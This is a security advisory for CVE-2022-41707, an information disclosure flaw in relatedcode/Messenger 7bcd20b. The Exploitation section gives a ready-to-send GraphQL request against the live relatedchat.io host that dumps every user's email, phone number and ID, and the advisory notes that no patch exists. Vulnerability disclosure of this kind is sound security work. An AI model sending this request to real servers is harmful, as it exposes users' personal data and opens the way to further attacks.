---
slug: advisories/coldplay/
title: relatedcode/Messenger 7bcd20b - Information Disclosure
authors: Carlos Bello
writer: cbello
codename: coldplay
product: relatedcode/Messenger 7bcd20b
date: 2022-10-14 10:00 COT
cveid: CVE-2022-41707
severity: 6.5
description: relatedcode/Messenger 7bcd20b  -  Sensitive Information Disclosure
keywords: Fluid Attacks, Security, Vulnerabilities, Relatedcode, Messenger
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | relatedcode/Messenger 7bcd20b  -  Sensitive Information Disclosure |
| **Code name**         | [Coldplay](https://en.wikipedia.org/wiki/Coldplay)                 |
| **Product**           | relatedcode/Messenger                                              |
| **Affected versions** | Version 7bcd20b                                                    |
| **State**             | Public                                                             |
| **Release date**      | 2022-10-14                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Business information leak - Personal Information                                                                            |
| **Rule**              | [226. Business information leak - Personal Information](https://docs.fluidattacks.com/criteria/vulnerabilities/226)         |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N                                                                                |
| **CVSSv3 Base Score** | 6.5                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-41707](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41707)                                             |

## Description

Relatedcode/Messenger version 7bcd20b allows an authenticated external attacker to
access sensitive data of any user of the application. This is possible
because the application exposes user data to the public.

## Vulnerability

The application exposes the session data of the users of the application
to the public. Among the exposed data are:

* ID
* Email
* PhoneNumber
* Etc

![image.png](https://user-images.githubusercontent.com/51862990/195862599-c66cafc2-09a1-457d-88ba-c4b2fabdf24a.png)

The ID exposed in this vulnerability will help us to exploit even a
[broken access control](../tiesto/)
present in this application.

## Exploitation

To exploit this vulnerability, simply create an account on the server and
then send the following request:

```txt
POST /graphql HTTP/2
Host: relatedchat.io:4000
User-Agent: Something
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://relatedchat.io/
Content-Type: application/json
Authorization: Bearer [YOUR TOKEN]
Origin: https://relatedchat.io
Content-Length: 356

{"operationName":"ListUsers","variables":{},"query":"query ListUsers($updatedAt: Date, $workspaceId: String) {\n  listUsers(updatedAt: $updatedAt, workspaceId: $workspaceId) {\n    objectId\n    displayName\n    email\n  fullName\n    phoneNumber\n    photoURL\n    theme\n    thumbnailURL\n    title\n    workspaces\n    createdAt\n    updatedAt\n  }\n}"}
```

## Impact

An authenticated remote attacker can access sensitive user data. This allows
an attacker to obtain enough information to escalate to more serious attacks.
In our case, we managed to exploit a broken access control thanks to the data
leaked in this vulnerability. Thanks to this I was able to access all the
internal chat logs of all registered users.

## Our security police

We have reserved the CVE-2022-41707 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: relatedcode/Messenger 7bcd20b

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from the Offensive
Team of `Fluid Attacks`.

## References

**Vendor page** <https://github.com/relatedcode/Messenger>

## Timeline

<time-lapse
  discovered="2022-09-23"
  contacted="2022-09-23"
  replied="2022-09-23"
  confirmed="2022-09-23"
  patched=""
  disclosure="2022-10-14">
</time-lapse>
